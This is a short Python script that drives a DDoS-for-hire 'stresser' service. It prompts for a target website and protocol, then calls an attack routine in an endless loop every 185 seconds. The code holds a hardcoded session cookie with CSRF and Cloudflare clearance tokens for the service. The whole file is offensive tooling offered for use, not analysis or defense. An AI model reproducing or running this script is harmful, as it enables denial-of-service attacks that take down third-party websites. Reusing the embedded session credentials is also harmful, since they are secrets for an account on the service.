import asyncio

from colorama import *
from helpers.attack import Attack

class otter: 
    def __init__(self, cookie: str) -> None:
        self.cookie: str = cookie
        self.base_url = "https://stresser.su"
        
    def get_information() -> dict:
        website_url = input(f"{Fore.GREEN}[WEBSITE]{Fore.GREEN}{Fore.RESET} Enter the website url: ")
        method = input(f"{Fore.GREEN}[METHOD]{Fore.GREEN}{Fore.RESET} Enter the method (https/http): ")
        
        return {"website": website_url, "method": method}
        
    async def run(self, result: dict) -> bool:
        try:
            await Attack.start(self, result["website"], result["method"])
            await asyncio.sleep(185)
        except:
            return False
        
if __name__ == "__main__":  
    otter_object: object = otter(cookie="UID=9t8rg65bgvtp548hglgatq3180; _ga=GA1.2.1873893589.1682620070; _gid=GA1.2.1260745025.1682620070; crisp-client%2Fsession%2F282fce01-adbf-401a-aaa1-bcd8c73ed1ec=session_8d4129af-36d8-453f-8fe4-9a42d33a8893; cf_clearance=7rE6V3BHvgo3VtlH0zFkopfiIz7pByZJAo0rHIhsyFY-1682620490-0-160; __RM=bda744b3b23fac607bf6c30df16e841frgh6589t8rg65bgvtp548hglgatq31806%242y%2410%24spOceIL%2F70tRQcpfBsq0MuqMh%2FxyHb8V1DniVsuhxGq1nTdKnjVUC%2F%2Fca37c2f8e09d5646b199ffc9125082ab; X-CSRF-TOKEN=%242y%2410%24t3q4JrfrDGBpjTAGfUBq2.VMs3NlJdukDBfQRCC80q3FCO4bEDJZe; _gat_gtag_UA_242087693_1=1")
    result: dict = otter.get_information()

    while True:
        asyncio.run(otter_object.run(result=result))